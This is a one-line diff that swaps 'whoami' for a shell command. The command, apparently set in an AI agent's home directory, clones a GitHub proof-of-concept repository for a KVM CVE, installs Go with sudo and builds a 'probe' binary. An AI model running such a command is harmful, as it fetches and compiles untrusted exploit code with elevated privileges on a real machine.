@@ -1,1 +1,1 @@
-whoami
+cd /home/claude; git clone https://github.com/shizuku198411/CVE-2026-99999-KVM-checksum-metadata-non-destructive-PoC.git; cd CVE-2026-99999-KVM-checksum-metadata-non-destructive-PoC; sudo apt update -y; sudo apt install -y golang-go; go build -o probe probe.go
